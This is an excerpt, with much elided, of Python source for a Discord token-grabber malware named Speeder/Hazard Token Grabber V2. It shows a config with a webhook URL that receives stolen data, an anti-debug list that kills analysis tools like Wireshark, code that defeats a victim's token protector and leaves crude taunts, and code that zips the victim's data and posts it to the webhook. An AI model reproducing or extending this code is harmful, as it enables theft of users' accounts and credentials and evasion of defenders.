...
config = {
    # SET YOUR WEBHOOK. 
    'webhook': "https://discord.com/api/webhooks/1172958876711260241/b3MA_OaFUHGMFYdYiWwHuaDDLVBC9tVOM2fyTiQFr_KFvwEvZVN58UeDGsCbCuwXESrX",
    ...
    'anti_debug': True,
    # This list of programs will be killed if  detects that any of these are running, you can add more or remove programs if you want.
    'blackListedPrograms':
    [
        "httpdebuggerui",
        "wireshark",
...
class Hazard_Token_Grabber_V2(functions):
        ...
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['Phantasm just raped your token-protector shit LMAOOOO'] = "https://github.com/JavorR1"
            ...
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Speeder just raped your token-protector shit LMAOOOO | https://github.com/JavorR1")
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x+"\n\n🌟・Grabber By github.com/JavoR1・https://github.com/JavorR1/Speeder-Nuker-Token-Grabber")
        ...
        _zipfile = os.path.join(
            self.appdata, f'Speeder Token Grabber-[{Victim}].zip')
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'{username} Just ran Speeder Token Grabber',
                        'url': 'https://github.com/JavorR1/Speeder-Nuker-Token-Grabber',
                        'icon_url': 'https://media.tenor.com/6c_TzpYEf3gAAAAC/star-wars-the-mandalorian.gif'
                    },
                    'color': 16119101,
                    ...
                    'footer': {
                        'text': '🌟・Grabber By github.com/JavoR1・https://github.com/JavorR1/Speeder-Nuker-Token-Grabber'
                    }
                }
            ]
        }
